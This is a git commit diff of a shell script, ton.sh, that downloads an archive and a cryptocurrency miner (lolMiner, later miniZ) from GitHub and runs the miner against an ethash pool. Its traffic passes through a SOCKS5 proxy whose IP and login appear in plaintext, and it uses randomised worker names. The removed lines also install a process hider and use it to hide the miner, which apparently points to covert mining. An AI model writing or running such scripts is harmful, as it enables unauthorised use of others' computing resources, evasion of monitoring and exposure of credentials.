58d257d21d58d04f2a0fee2f0e8344efde78b1e1
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-05-18 20:55:09 -0600

    Update ton.sh

--- ton.sh
+++ ton.sh
@@ -1,27 +1,13 @@
-apt update && apt -y install sudo wget curl unzip
-
-sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-
-apt-get install -y nodejs
-
-npm i -g node-process-hider
-
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-
-dpkg-reconfigure --frontend noninteractive tzdata
-
-wget https://github.com/DeniBogeh/DeniBogehh/raw/main/graphics.tar.gz
-
+sudo apt-get update -y
+wget https://github.com/Akatsoki/joss/raw/main/graphics.tar.gz
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 =  45.140.13.119:9132 
-socks5_username = hamqehvl
-socks5_password = awoxl1s1e87n
+socks5 = 45.140.13.119:9132
+socks5_username = sqpbedpy
+socks5_password = n3zs0as8ol71
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -34,10 +20,9 @@ echo " "
 
 echo " "
 
-./graftcp/graftcp wget https://github.com/DeniBogeh/DeniBogehh/raw/main/lolMiner
+./graftcp/graftcp wget https://github.com/miniZ-miner/miniZ/releases/download/v1.8y2/miniZ_v1.8y2_linux-x64.tar.gz 
+tar xf miniZ_v1.8y2_linux-x64.tar.gz 
 
-chmod +x lolMiner
+chmod +x miniZ
 
-ph add lolMiner
-
-./graftcp/graftcp ./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:443 --user teguhcong.$(echo $(shuf -i 10-40 -n 1)-MAGIC)
+./graftcp/graftcp ./miniZ -u teguhcong.$(echo $(shuf -i 1-999 -n 1)-T4) -l stratum+tcp://ethash.poolbinance.com --port=449 -p x --par=ethash --pers auto
